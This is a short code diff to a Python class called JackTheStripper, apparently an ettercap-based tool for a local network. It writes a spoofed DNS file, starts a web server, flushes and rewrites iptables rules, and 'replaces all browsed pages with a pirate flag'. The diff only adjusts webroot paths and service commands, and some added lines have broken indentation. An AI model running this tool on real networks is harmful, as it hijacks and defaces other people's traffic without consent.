@@ -14,7 +14,7 @@ class JackTheStripper():
 		self.splash()
 		self.checkCompliance()
 		self.setParams()
-		if self.blockWebBrowsing == 'y' or self.blockWebBrowsing == 'Y': self.block()
+		if self.blockWebBrowsing.lower() == 'y': self.block()
 		else: self.transpose()
 		self.poison()
 
@@ -109,8 +109,7 @@ class JackTheStripper():
 		'Replaces all browsed pages with a pirate flag'
 		import tarfile, os, shutil
 		wwwroot = ''
-		if os.path.isdir("/var/www/html"): wwwroot = "/var/www/html"
-		elif os.path.isdir("/var/www"): wwwroot = "/var/www"
+                wwwroot = "/srv/http" if os.path.isdir ("/srv/http") else ("/var/www/html" if os.path.isdir("/var/www/html") else ("/var/www" if os.path.isdir("/var/www") else '')) 
 		if wwwroot == '':
 			print 'Could not find a valid webroot path, please install apache2 or httpd before proceed'
 			sys.exit(2)
@@ -125,8 +124,8 @@ class JackTheStripper():
 			dnsFile.close()
 			shutil.copy2('etter.dns', '/usr/share/ettercap/etter.dns')
 			os.rename('etter.dns', '/etc/ettercap/etter.dns')
-			p1 = subprocess.Popen(['service', 'apache2', 'start'])
-			p1 = subprocess.Popen(['service', 'httpd', 'start'])
+                        p1 = subprocess.Popen(['systemctl', 'start', 'httpd.service'])
+#			p1 = subprocess.Popen(['service', 'httpd', 'start'])
 			subprocess.call(['iptables', '-t', 'nat', '-F'])
 			subprocess.call(['iptables', '-F', 'INPUT'])
 			subprocess.call(['iptables', '-A', 'INPUT', '-p', 'tcp', '--dport', '80', '-j', 'ACCEPT'])
